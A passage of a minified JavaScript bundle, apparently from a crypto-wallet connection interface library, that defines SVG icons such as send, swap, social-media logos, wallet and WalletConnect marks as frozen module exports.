4.69183C15.7044 4.55297 15.5673 4.43792 15.4114 4.35365C15.2837 4.28459 15.0372 4.2191 14.3808 4.34812ZM7.99373 13.603C6.11919 12.9864 4.6304 12.4902 3.5606 12.0121C2.98683 11.7557 2.4778 11.4808 2.07383 11.1599C1.66337 10.8339 1.31312 10.4217 1.14744 9.88551C0.949667 9.24541 0.950886 8.56035 1.15094 7.92096C1.31852 7.38534 1.67024 6.97442 2.08185 6.64985C2.48697 6.33041 2.99697 6.05734 3.57166 5.80295C4.70309 5.3021 6.30179 4.78283 8.32903 4.12437L11.0196 3.25042C12.2166 2.86159 13.2017 2.54158 13.9951 2.38566C14.8065 2.22618 15.6202 2.19289 16.3627 2.59437C16.7568 2.80747 17.1035 3.09839 17.3818 3.4495C17.9062 4.111 18.0147 4.91815 17.9985 5.74496C17.9827 6.55332 17.8386 7.57903 17.6636 8.82534L17.2701 11.6268C16.9737 13.7376 16.7399 15.4022 16.4432 16.6034C16.2924 17.2135 16.1121 17.7632 15.8678 18.2176C15.6197 18.6794 15.2761 19.0971 14.7777 19.3551C14.1827 19.6632 13.5083 19.7833 12.8436 19.6997C12.2867 19.6297 11.82 19.3563 11.4277 19.0087C11.0415 18.6666 10.6824 18.213 10.3302 17.6925C9.67361 16.722 8.92648 15.342 7.99373 13.603Z"
    clip-rule="evenodd"
  />
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="21"
    height="20"
    viewBox="0 0 21 20"
    fill="none"
  ></svg></svg
>`,wpt=Object.freeze(Object.defineProperty({__proto__:null,sendSvg:mpt},Symbol.toStringTag,{value:"Module"})),bpt=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.76.3a1 1 0 0 1 0 1.4L4.07 4.4h9a1 1 0 1 1 0 2h-9l2.69 2.68a1 1 0 1 1-1.42 1.42L.95 6.09a1 1 0 0 1 0-1.4l4.4-4.4a1 1 0 0 1 1.4 0Zm6.49 9.21a1 1 0 0 1 1.41 0l4.39 4.4a1 1 0 0 1 0 1.4l-4.39 4.4a1 1 0 0 1-1.41-1.42l2.68-2.68h-9a1 1 0 0 1 0-2h9l-2.68-2.68a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`,vpt=Object.freeze(Object.defineProperty({__proto__:null,swapHorizontalSvg:bpt},Symbol.toStringTag,{value:"Module"})),ypt=xe`<svg
  width="14"
  height="14"
  viewBox="0 0 14 14"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M13.7306 3.24213C14.0725 3.58384 14.0725 4.13786 13.7306 4.47957L10.7418 7.46737C10.4 7.80908 9.84581 7.80908 9.50399 7.46737C9.16216 7.12567 9.16216 6.57165 9.50399 6.22994L10.9986 4.73585H5.34082C4.85741 4.73585 4.46553 4.3441 4.46553 3.86085C4.46553 3.3776 4.85741 2.98585 5.34082 2.98585L10.9986 2.98585L9.50399 1.49177C9.16216 1.15006 9.16216 0.596037 9.50399 0.254328C9.84581 -0.0873803 10.4 -0.0873803 10.7418 0.254328L13.7306 3.24213ZM9.52515 10.1352C9.52515 10.6185 9.13327 11.0102 8.64986 11.0102L2.9921 11.0102L4.48669 12.5043C4.82852 12.846 4.82852 13.4001 4.48669 13.7418C4.14487 14.0835 3.59066 14.0835 3.24884 13.7418L0.26003 10.754C0.0958806 10.5899 0.0036621 10.3673 0.00366211 10.1352C0.00366212 9.90318 0.0958806 9.68062 0.26003 9.51652L3.24884 6.52872C3.59066 6.18701 4.14487 6.18701 4.48669 6.52872C4.82851 6.87043 4.82851 7.42445 4.48669 7.76616L2.9921 9.26024L8.64986 9.26024C9.13327 9.26024 9.52515 9.65199 9.52515 10.1352Z"
    fill="currentColor"
  />
</svg>

`,xpt=Object.freeze(Object.defineProperty({__proto__:null,swapHorizontalMediumSvg:ypt},Symbol.toStringTag,{value:"Module"})),Cpt=xe`<svg width="10" height="10" viewBox="0 0 10 10">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.77986 0.566631C4.0589 0.845577 4.0589 1.29784 3.77986 1.57678L3.08261 2.2738H6.34184C6.73647 2.2738 7.05637 2.5936 7.05637 2.98808C7.05637 3.38257 6.73647 3.70237 6.34184 3.70237H3.08261L3.77986 4.39938C4.0589 4.67833 4.0589 5.13059 3.77986 5.40954C3.50082 5.68848 3.04841 5.68848 2.76937 5.40954L0.852346 3.49316C0.573306 3.21421 0.573306 2.76195 0.852346 2.48301L2.76937 0.566631C3.04841 0.287685 3.50082 0.287685 3.77986 0.566631ZM6.22 4.59102C6.49904 4.31208 6.95145 4.31208 7.23049 4.59102L9.14751 6.5074C9.42655 6.78634 9.42655 7.23861 9.14751 7.51755L7.23049 9.43393C6.95145 9.71287 6.49904 9.71287 6.22 9.43393C5.94096 9.15498 5.94096 8.70272 6.22 8.42377L6.91725 7.72676L3.65802 7.72676C3.26339 7.72676 2.94349 7.40696 2.94349 7.01247C2.94349 6.61798 3.26339 6.29819 3.65802 6.29819L6.91725 6.29819L6.22 5.60117C5.94096 5.32223 5.94096 4.86997 6.22 4.59102Z"
    clip-rule="evenodd"
  />
</svg>`,Ept=Object.freeze(Object.defineProperty({__proto__:null,swapHorizontalBoldSvg:Cpt},Symbol.toStringTag,{value:"Module"})),_pt=xe`<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
  <path 
    fill="currentColor"
    fill-rule="evenodd" 
    clip-rule="evenodd" 
    d="M8.3071 0.292893C8.69763 0.683417 8.69763 1.31658 8.3071 1.70711L6.41421 3.6H11.3404C13.8368 3.6 16.0533 5.1975 16.8427 7.56588L16.9487 7.88377C17.1233 8.40772 16.8402 8.97404 16.3162 9.14868C15.7923 9.32333 15.226 9.04017 15.0513 8.51623L14.9453 8.19834C14.4281 6.64664 12.976 5.6 11.3404 5.6H6.41421L8.3071 7.49289C8.69763 7.88342 8.69763 8.51658 8.3071 8.90711C7.91658 9.29763 7.28341 9.29763 6.89289 8.90711L3.29289 5.30711C2.90236 4.91658 2.90236 4.28342 3.29289 3.89289L6.89289 0.292893C7.28341 -0.0976311 7.91658 -0.0976311 8.3071 0.292893ZM3.68377 10.8513C4.20771 10.6767 4.77403 10.9598 4.94868 11.4838L5.05464 11.8017C5.57188 13.3534 7.024 14.4 8.65964 14.4L13.5858 14.4L11.6929 12.5071C11.3024 12.1166 11.3024 11.4834 11.6929 11.0929C12.0834 10.7024 12.7166 10.7024 13.1071 11.0929L16.7071 14.6929C17.0976 15.0834 17.0976 15.7166 16.7071 16.1071L13.1071 19.7071C12.7166 20.0976 12.0834 20.0976 11.6929 19.7071C11.3024 19.3166 11.3024 18.6834 11.6929 18.2929L13.5858 16.4L8.65964 16.4C6.16314 16.4 3.94674 14.8025 3.15728 12.4341L3.05131 12.1162C2.87667 11.5923 3.15983 11.026 3.68377 10.8513Z" 
  />
</svg>`,Spt=Object.freeze(Object.defineProperty({__proto__:null,swapHorizontalRoundedBoldSvg:_pt},Symbol.toStringTag,{value:"Module"})),Apt=xe`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.48 2.18a1 1 0 0 1 1.41 0l2.68 2.68a1 1 0 1 1-1.41 1.42l-.98-.98v4.56a1 1 0 0 1-2 0V5.3l-.97.98A1 1 0 0 1 .79 4.86l2.69-2.68Zm6.34 2.93a1 1 0 0 1 1 1v4.56l.97-.98a1 1 0 1 1 1.42 1.42l-2.69 2.68a1 1 0 0 1-1.41 0l-2.68-2.68a1 1 0 0 1 1.41-1.42l.98.98V6.1a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,Ipt=Object.freeze(Object.defineProperty({__proto__:null,swapVerticalSvg:Apt},Symbol.toStringTag,{value:"Module"})),Tpt=xe`<svg width="32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
  <g clip-path="url(#a)">
    <path fill="url(#b)" d="M0 0h32v32H0z"/>
    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.034 15.252c4.975-2.167 8.293-3.596 9.953-4.287 4.74-1.971 5.725-2.314 6.366-2.325.142-.002.457.033.662.198.172.14.22.33.243.463.022.132.05.435.028.671-.257 2.7-1.368 9.248-1.933 12.27-.24 1.28-.71 1.708-1.167 1.75-.99.091-1.743-.655-2.703-1.284-1.502-.985-2.351-1.598-3.81-2.558-1.684-1.11-.592-1.721.368-2.718.252-.261 4.619-4.233 4.703-4.594.01-.045.02-.213-.08-.301-.1-.09-.246-.059-.353-.035-.15.034-2.55 1.62-7.198 4.758-.682.468-1.298.696-1.851.684-.61-.013-1.782-.344-2.653-.628-1.069-.347-1.918-.53-1.845-1.12.039-.308.462-.623 1.27-.944Z" fill="#fff"/>
  </g>
  <path d="M.5 16C.5 7.44 7.44.5 16 .5 24.56.5 31.5 7.44 31.5 16c0 8.56-6.94 15.5-15.5 15.5C7.44 31.5.5 24.56.5 16Z" stroke="#141414" stroke-opacity=".05"/>
  <defs>
    <linearGradient id="b" x1="1600" y1="0" x2="1600" y2="3176.27" gradientUnits="userSpaceOnUse">
      <stop stop-color="#2AABEE"/>
      <stop offset="1" stop-color="#229ED9"/>
    </linearGradient>
    <clipPath id="a">
      <path d="M0 16C0 7.163 7.163 0 16 0s16 7.163 16 16-7.163 16-16 16S0 24.837 0 16Z" fill="#fff"/>
    </clipPath>
  </defs>
</svg>`,kpt=Object.freeze(Object.defineProperty({__proto__:null,telegramSvg:Tpt},Symbol.toStringTag,{value:"Module"})),Npt=xe`<svg width="14" height="15" viewBox="0 0 14 15" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M7 3.71875C6.0335 3.71875 5.25 2.93525 5.25 1.96875C5.25 1.00225 6.0335 0.21875 7 0.21875C7.9665 0.21875 8.75 1.00225 8.75 1.96875C8.75 2.93525 7.9665 3.71875 7 3.71875Z" fill="#949E9E"/>
  <path d="M7 8.96875C6.0335 8.96875 5.25 8.18525 5.25 7.21875C5.25 6.25225 6.0335 5.46875 7 5.46875C7.9665 5.46875 8.75 6.25225 8.75 7.21875C8.75 8.18525 7.9665 8.96875 7 8.96875Z" fill="#949E9E"/>
  <path d="M5.25 12.4688C5.25 13.4352 6.0335 14.2187 7 14.2187C7.9665 14.2187 8.75 13.4352 8.75 12.4688C8.75 11.5023 7.9665 10.7188 7 10.7188C6.0335 10.7188 5.25 11.5023 5.25 12.4688Z" fill="#949E9E"/>
</svg>`,Ppt=Object.freeze(Object.defineProperty({__proto__:null,threeDotsSvg:Npt},Symbol.toStringTag,{value:"Module"})),$pt=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5A3E85" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M18.22 25.7 20 23.91h3.34l2.1-2.1v-6.68H15.4v8.78h2.82v1.77Zm3.87-8.16h1.25v3.66H22.1v-3.66Zm-3.34 0H20v3.66h-1.25v-3.66ZM20 7.9a12 12 0 1 0 0 24 12 12 0 0 0 0-24Zm6.69 14.56-3.66 3.66h-2.72l-1.77 1.78h-1.88V26.1H13.3v-9.82l.94-2.4H26.7v8.56Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,Rpt=Object.freeze(Object.defineProperty({__proto__:null,twitchSvg:$pt},Symbol.toStringTag,{value:"Module"})),Opt=xe`<svg fill="none" viewBox="0 0 41 40">
  <g clip-path="url(#a)">
    <path fill="#000" d="M.8 0h40v40H.8z" />
    <path
      fill="#fff"
      d="m22.63 18.46 7.14-8.3h-1.69l-6.2 7.2-4.96-7.2H11.2l7.5 10.9-7.5 8.71h1.7l6.55-7.61 5.23 7.61h5.72l-7.77-11.31Zm-9.13-7.03h2.6l11.98 17.13h-2.6L13.5 11.43Z"
    />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M.8 20a20 20 0 1 1 40 0 20 20 0 0 1-40 0Z" /></clipPath>
  </defs>
</svg>`,tZ=Object.freeze(Object.defineProperty({__proto__:null,xSvg:Opt},Symbol.toStringTag,{value:"Module"})),Bpt=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="m14.36 4.74.01.42c0 4.34-3.3 9.34-9.34 9.34A9.3 9.3 0 0 1 0 13.03a6.6 6.6 0 0 0 4.86-1.36 3.29 3.29 0 0 1-3.07-2.28c.5.1 1 .07 1.48-.06A3.28 3.28 0 0 1 .64 6.11v-.04c.46.26.97.4 1.49.41A3.29 3.29 0 0 1 1.11 2.1a9.32 9.32 0 0 0 6.77 3.43 3.28 3.28 0 0 1 5.6-3 6.59 6.59 0 0 0 2.08-.8 3.3 3.3 0 0 1-1.45 1.82A6.53 6.53 0 0 0 16 3.04c-.44.66-1 1.23-1.64 1.7Z"
  />
</svg>`,Mpt=Object.freeze(Object.defineProperty({__proto__:null,twitterIconSvg:Bpt},Symbol.toStringTag,{value:"Module"})),Dpt=xe`<svg fill="none" viewBox="0 0 28 28">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M18.1 4.76c-.42-.73-1.33-1.01-2.09-.66l-1.42.66c-.37.18-.8.18-1.18 0l-1.4-.65a1.63 1.63 0 0 0-2.1.66l-.84 1.45c-.2.34-.53.59-.92.67l-1.7.35c-.83.17-1.39.94-1.3 1.78l.19 1.56c.04.39-.08.78-.33 1.07l-1.12 1.3c-.52.6-.52 1.5 0 2.11L5 16.38c.25.3.37.68.33 1.06l-.18 1.57c-.1.83.46 1.6 1.28 1.78l1.7.35c.4.08.73.32.93.66l.84 1.43a1.63 1.63 0 0 0 2.09.66l1.41-.66c.37-.17.8-.17 1.18 0l1.43.67c.76.35 1.66.07 2.08-.65l.86-1.45c.2-.34.54-.58.92-.66l1.68-.35A1.63 1.63 0 0 0 22.84 19l-.18-1.57a1.4 1.4 0 0 1 .33-1.06l1.12-1.32c.52-.6.52-1.5 0-2.11l-1.12-1.3a1.4 1.4 0 0 1-.33-1.07l.18-1.57c.1-.83-.46-1.6-1.28-1.77l-1.68-.35a1.4 1.4 0 0 1-.92-.66l-.86-1.47Zm-3.27-3.2a4.43 4.43 0 0 1 5.69 1.78l.54.93 1.07.22a4.43 4.43 0 0 1 3.5 4.84l-.11.96.7.83a4.43 4.43 0 0 1 .02 5.76l-.72.85.1.96a4.43 4.43 0 0 1-3.5 4.84l-1.06.22-.54.92a4.43 4.43 0 0 1-5.68 1.77l-.84-.4-.82.39a4.43 4.43 0 0 1-5.7-1.79l-.51-.89-1.09-.22a4.43 4.43 0 0 1-3.5-4.84l.1-.96-.72-.85a4.43 4.43 0 0 1 .01-5.76l.71-.83-.1-.95a4.43 4.43 0 0 1 3.5-4.84l1.08-.23.53-.9a4.43 4.43 0 0 1 5.7-1.8l.81.38.83-.39ZM18.2 9.4c.65.42.84 1.28.42 1.93l-4.4 6.87a1.4 1.4 0 0 1-2.26.14L9.5 15.39a1.4 1.4 0 0 1 2.15-1.8l1.23 1.48 3.38-5.26a1.4 1.4 0 0 1 1.93-.42Z"
    clip-rule="evenodd"
  />
</svg>`,Lpt=Object.freeze(Object.defineProperty({__proto__:null,verifySvg:Dpt},Symbol.toStringTag,{value:"Module"})),Upt=xe`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="m4.1 12.43-.45-.78-.93-.2a1.65 1.65 0 0 1-1.31-1.8l.1-.86-.61-.71a1.65 1.65 0 0 1 0-2.16l.6-.7-.09-.85c-.1-.86.47-1.64 1.3-1.81l.94-.2.45-.78A1.65 1.65 0 0 1 6.23.9l.77.36.78-.36c.77-.36 1.69-.07 2.12.66l.47.8.91.2c.84.17 1.4.95 1.31 1.8l-.1.86.6.7c.54.62.54 1.54.01 2.16l-.6.71.09.86c.1.85-.47 1.63-1.3 1.8l-.92.2-.47.79a1.65 1.65 0 0 1-2.12.66L7 12.74l-.77.36c-.78.35-1.7.07-2.13-.67Zm5.74-6.9a1 1 0 1 0-1.68-1.07L6.32 7.3l-.55-.66a1 1 0 0 0-1.54 1.28l1.43 1.71a1 1 0 0 0 1.61-.1l2.57-4Z"
    clip-rule="evenodd"
  />
</svg>`,jpt=Object.freeze(Object.defineProperty({__proto__:null,verifyFilledSvg:Upt},Symbol.toStringTag,{value:"Module"})),Fpt=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 5.5c0-1.8 1.46-3.25 3.25-3.25H14.5c1.8 0 3.25 1.46 3.25 3.25v.28A3.25 3.25 0 0 1 20 8.88v2.24c0 1.45-.94 2.68-2.25 3.1v.28c0 1.8-1.46 3.25-3.25 3.25H3.25A3.25 3.25 0 0 1 0 14.5v-9Zm15.75 8.88h-2.38a4.38 4.38 0 0 1 0-8.76h2.38V5.5c0-.69-.56-1.25-1.25-1.25H3.25C2.56 4.25 2 4.81 2 5.5v9c0 .69.56 1.25 1.25 1.25H14.5c.69 0 1.25-.56 1.25-1.25v-.13Zm-2.38-6.76a2.37 2.37 0 1 0 0 4.75h3.38c.69 0 1.25-.55 1.25-1.24V8.87c0-.69-.56-1.24-1.25-1.24h-3.38Z"
    clip-rule="evenodd"
  />
</svg>`,qpt=Object.freeze(Object.defineProperty({__proto__:null,walletSvg:Fpt},Symbol.toStringTag,{value:"Module"})),zpt=xe`<svg fill="none" viewBox="0 0 96 67">
  <path
    fill="currentColor"
    d="M25.32 18.8a32.56 32.56 0 0 1 45.36 0l1.5 1.47c.63.62.63 1.61 0 2.22l-5.15 5.05c-.31.3-.82.3-1.14 0l-2.07-2.03a22.71 22.71 0 0 0-31.64 0l-2.22 2.18c-.31.3-.82.3-1.14 0l-5.15-5.05a1.55 1.55 0 0 1 0-2.22l1.65-1.62Zm56.02 10.44 4.59 4.5c.63.6.63 1.6 0 2.21l-20.7 20.26c-.62.61-1.63.61-2.26 0L48.28 41.83a.4.4 0 0 0-.56 0L33.03 56.21c-.63.61-1.64.61-2.27 0L10.07 35.95a1.55 1.55 0 0 1 0-2.22l4.59-4.5a1.63 1.63 0 0 1 2.27 0L31.6 43.63a.4.4 0 0 0 .57 0l14.69-14.38a1.63 1.63 0 0 1 2.26 0l14.69 14.38a.4.4 0 0 0 .57 0l14.68-14.38a1.63 1.63 0 0 1 2.27 0Z"
  />
  <path
    stroke="#000"
    stroke-opacity=".1"
    d="M25.67 19.15a32.06 32.06 0 0 1 44.66 0l1.5 1.48c.43.42.43 1.09 0 1.5l-5.15 5.05a.31.31 0 0 1-.44 0l-2.07-2.03a23.21 23.21 0 0 0-32.34 0l-2.22 2.18a.31.31 0 0 1-.44 0l-5.15-5.05a1.05 1.05 0 0 1 0-1.5l1.65-1.63ZM81 29.6l4.6 4.5c.42.41.42 1.09 0 1.5l-20.7 20.26c-.43.43-1.14.43-1.57 0L48.63 41.47a.9.9 0 0 0-1.26 0L32.68 55.85c-.43.43-1.14.43-1.57 0L10.42 35.6a1.05 1.05 0 0 1 0-1.5l4.59-4.5a1.13 1.13 0 0 1 1.57 0l14.68 14.38a.9.9 0 0 0 1.27 0l-.35-.35.35.35L47.22 29.6a1.13 1.13 0 0 1 1.56 0l14.7 14.38a.9.9 0 0 0 1.26 0L79.42 29.6a1.13 1.13 0 0 1 1.57 0Z"
  />
</svg>`,Wpt=xe`
<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_22274_4692)">
<path d="M0 6.64C0 4.17295 0 2.93942 0.525474 2.01817C0.880399 1.39592 1.39592 0.880399 2.01817 0.525474C2.93942 0 4.17295 0 6.64 0H9.36C11.8271 0 13.0606 0 13.9818 0.525474C14.6041 0.880399 15.1196 1.39592 15.4745 2.01817C16 2.93942 16 4.17295 16 6.64V9.36C16 11.8271 16 13.0606 15.4745 13.9818C15.1196 14.6041 14.6041 15.1196 13.9818 15.4745C13.0606 16 11.8271 16 9.36 16H6.64C4.17295 16 2.93942 16 2.01817 15.4745C1.39592 15.1196 0.880399 14.6041 0.525474 13.9818C0 13.0606 0 11.8271 0 9.36V6.64Z" fill="#C7B994"/>
<path d="M4.49038 5.76609C6.42869 3.86833 9.5713 3.86833 11.5096 5.76609L11.7429 5.99449C11.8398 6.08938 11.8398 6.24323 11.7429 6.33811L10.9449 7.11942C10.8964 7.16686 10.8179 7.16686 10.7694 7.11942L10.4484 6.80512C9.09617 5.48119 6.90381 5.48119 5.5516 6.80512L5.20782 7.14171C5.15936 7.18915 5.08079 7.18915 5.03234 7.14171L4.23434 6.3604C4.13742 6.26552 4.13742 6.11167 4.23434 6.01678L4.49038 5.76609ZM13.1599 7.38192L13.8702 8.07729C13.9671 8.17217 13.9671 8.32602 13.8702 8.4209L10.6677 11.5564C10.5708 11.6513 10.4137 11.6513 10.3168 11.5564L8.04388 9.33105C8.01965 9.30733 7.98037 9.30733 7.95614 9.33105L5.6833 11.5564C5.58638 11.6513 5.42925 11.6513 5.33234 11.5564L2.12982 8.42087C2.0329 8.32598 2.0329 8.17213 2.12982 8.07724L2.84004 7.38188C2.93695 7.28699 3.09408 7.28699 3.191 7.38188L5.46392 9.60726C5.48815 9.63098 5.52743 9.63098 5.55166 9.60726L7.82447 7.38188C7.92138 7.28699 8.07851 7.28699 8.17543 7.38187L10.4484 9.60726C10.4726 9.63098 10.5119 9.63098 10.5361 9.60726L12.809 7.38192C12.9059 7.28703 13.063 7.28703 13.1599 7.38192Z" fill="#202020"/>
</g>
<defs>
<clipPath id="clip0_22274_4692">
<path d="M0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8Z" fill="white"/>
</clipPath>
</defs>
</svg>
`,Hpt=xe`
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="11" cy="11" r="11" transform="matrix(-1 0 0 1 23 1)" fill="#202020"/>
<circle cx="11" cy="11" r="11.5" transform="matrix(-1 0 0 1 23 1)" stroke="#C7B994" stroke-opacity="0.7"/>
<path d="M15.4523 11.0686L16.7472 9.78167C13.8205 6.87297 10.1838 6.87297 7.25708 9.78167L8.55201 11.0686C10.7779 8.85645 13.2279 8.85645 15.4538 11.0686H15.4523Z" fill="#C7B994"/>
<path d="M15.0199 14.067L12 11.0656L8.98 14.067L5.96004 11.0656L4.66663 12.3511L8.98 16.6393L12 13.638L15.0199 16.6393L19.3333 12.3511L18.0399 11.0656L15.0199 14.067Z" fill="#C7B994"/>
</svg>
`,FT=Object.freeze(Object.defineProperty({__proto__:null,walletConnectBrownSvg:Hpt,walletConnectLightBrownSvg:Wpt,walletConnectSvg:zpt},Symbol.toStringTag,{value:"Module"})),Vpt=xe`
  <svg fill="none" viewBox="0 0 48 44">
    <path
      style="fill: var(--wui-color-bg-300);"
      d="M4.56 8.64c-1.23 1.68-1.23 4.08-1.23 8.88v8.96c0 4.8 0 7.2 1.23 8.88.39.55.87 1.02 1.41 1.42C7.65 38 10.05 38 14.85 38h14.3c4.8 0 7.2 0 8.88-1.22a6.4 6.4 0 0 0 1.41-1.42c.83-1.14 1.1-2.6 1.19-4.92a6.4 6.4 0 0 0 5.16-4.65c.21-.81.21-1.8.21-3.79 0-1.98 0-2.98-.22-3.79a6.4 6.4 0 0 0-5.15-4.65c-.1-2.32-.36-3.78-1.19-4.92a6.4 6.4 0 0 0-1.41-1.42C36.35 6 33.95 6 29.15 6h-14.3c-4.8 0-7.2 0-8.88 1.22a6.4 6.4 0 0 0-1.41 1.42Z"
    />
    <path
      style="fill: var(--wui-color-fg-200);"
      fill-rule="evenodd"
      d="M2.27 11.33a6.4 6.4 0 0 1 6.4-6.4h26.66a6.4 6.4 0 0 1 6.4 6.4v1.7a6.4 6.4 0 0 1 5.34 6.3v5.34a6.4 6.4 0 0 1-5.34 6.3v1.7a6.4 6.4 0 0 1-6.4 6.4H8.67a6.4 6.4 0 0 1-6.4-6.4V11.33ZM39.6 31.07h-6.93a9.07 9.07 0 1 1 0-18.14h6.93v-1.6a4.27 4.27 0 0 0-4.27-4.26H8.67a4.27 4.27 0 0 0-4.27 4.26v21.34a4.27 4.27 0 0 0 4.27 4.26h26.66a4.27 4.27 0 0 0 4.27-4.26v-1.6Zm-6.93-16a6.93 6.93 0 0 0 0 13.86h8a4.27 4.27 0 0 0 4.26-4.26v-5.34a4.27 4.27 0 0 0-4.26-4.26h-8Z"
      clip-rule="evenodd"
    />
  </svg>
`,Kpt=Object.freeze(Object.defineProperty({__proto__:null,walletPlaceholderSvg:Vpt},Symbol.toStringTag,{value:"Module"})),Gpt=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M11 6.67a1 1 0 1 0-2 0v2.66a1 1 0 0 0 2 0V6.67ZM10 14.5a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 1a9 9 0 1 0 0 18 9 9 0 0 0 0-18Zm-7 9a7 7 0 1 1 14 0 7 7 0 0 1-14 0Z"
    clip-rule="evenodd"
  />
</svg>`,Zpt=Object.freeze(Object.defineProperty({__proto__:null,warningCircleSvg:Gpt},Symbol.toStringTag,{value:"Module"})),Ypt=xe`<svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M9.125 6.875C9.125 6.57833 9.21298 6.28832 9.3778 6.04165C9.54262 5.79497 9.77689 5.60271 10.051 5.48918C10.3251 5.37565 10.6267 5.34594 10.9176 5.40382C11.2086 5.4617 11.4759 5.60456 11.6857 5.81434C11.8954 6.02412 12.0383 6.29139 12.0962 6.58236C12.1541 6.87334 12.1244 7.17494 12.0108 7.44903C11.8973 7.72311 11.705 7.95738 11.4584 8.1222C11.2117 8.28703 10.9217 8.375 10.625 8.375C10.2272 8.375 9.84565 8.21696 9.56434 7.93566C9.28304 7.65436 9.125 7.27282 9.125 6.875ZM21.125 11C21.125 13.0025 20.5312 14.9601 19.4186 16.6251C18.3061 18.2902 16.7248 19.5879 14.8747 20.3543C13.0246 21.1206 10.9888 21.3211 9.02471 20.9305C7.06066 20.5398 5.25656 19.5755 3.84055 18.1595C2.42454 16.7435 1.46023 14.9393 1.06955 12.9753C0.678878 11.0112 0.879387 8.97543 1.64572 7.12533C2.41206 5.27523 3.70981 3.69392 5.37486 2.58137C7.0399 1.46882 8.99747 0.875 11 0.875C13.6844 0.877978 16.258 1.94567 18.1562 3.84383C20.0543 5.74199 21.122 8.3156 21.125 11ZM18.875 11C18.875 9.44247 18.4131 7.91992 17.5478 6.62488C16.6825 5.32985 15.4526 4.32049 14.0136 3.72445C12.5747 3.12841 10.9913 2.97246 9.46367 3.27632C7.93607 3.58017 6.53288 4.3302 5.43154 5.43153C4.3302 6.53287 3.58018 7.93606 3.27632 9.46366C2.97246 10.9913 3.12841 12.5747 3.72445 14.0136C4.32049 15.4526 5.32985 16.6825 6.62489 17.5478C7.91993 18.4131 9.44248 18.875 11 18.875C13.0879 18.8728 15.0896 18.0424 16.566 16.566C18.0424 15.0896 18.8728 13.0879 18.875 11ZM12.125 14.4387V11.375C12.125 10.8777 11.9275 10.4008 11.5758 10.0492C11.2242 9.69754 10.7473 9.5 10.25 9.5C9.98433 9.4996 9.72708 9.59325 9.52383 9.76435C9.32058 9.93544 9.18444 10.173 9.13952 10.4348C9.09461 10.6967 9.14381 10.966 9.27843 11.195C9.41304 11.4241 9.62438 11.5981 9.875 11.6863V14.75C9.875 15.2473 10.0725 15.7242 10.4242 16.0758C10.7758 16.4275 11.2527 16.625 11.75 16.625C12.0157 16.6254 12.2729 16.5318 12.4762 16.3607C12.6794 16.1896 12.8156 15.952 12.8605 15.6902C12.9054 15.4283 12.8562 15.159 12.7216 14.93C12.587 14.7009 12.3756 14.5269 12.125 14.4387Z" fill="currentColor"/>
</svg>`,Jpt=Object.freeze(Object.defineProperty({__proto__:null,infoSvg:Ypt},Symbol.toStringTag,{value:"Module"})),Qpt=xe`<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M15.0162 11.6312L9.55059 2.13937C9.39228 1.86862 9.16584 1.64405 8.8938 1.48798C8.62176 1.33192 8.3136 1.2498 7.99997 1.2498C7.68634 1.2498 7.37817 1.33192 7.10613 1.48798C6.83409 1.64405 6.60765 1.86862 6.44934 2.13937L0.983716 11.6312C0.830104 11.894 0.749146 12.1928 0.749146 12.4972C0.749146 12.8015 0.830104 13.1004 0.983716 13.3631C1.14027 13.6352 1.3664 13.8608 1.63889 14.0166C1.91139 14.1725 2.22044 14.253 2.53434 14.25H13.4656C13.7793 14.2528 14.0881 14.1721 14.3603 14.0163C14.6326 13.8604 14.8585 13.635 15.015 13.3631C15.1688 13.1005 15.2499 12.8017 15.2502 12.4973C15.2504 12.193 15.1696 11.8941 15.0162 11.6312ZM13.7162 12.6125C13.6908 12.6558 13.6541 12.6914 13.6101 12.7157C13.5661 12.7399 13.5164 12.7517 13.4662 12.75H2.53434C2.48415 12.7517 2.43442 12.7399 2.39042 12.7157C2.34641 12.6914 2.30976 12.6558 2.28434 12.6125C2.26278 12.5774 2.25137 12.5371 2.25137 12.4959C2.25137 12.4548 2.26278 12.4144 2.28434 12.3794L7.74997 2.88749C7.77703 2.84583 7.81408 2.8116 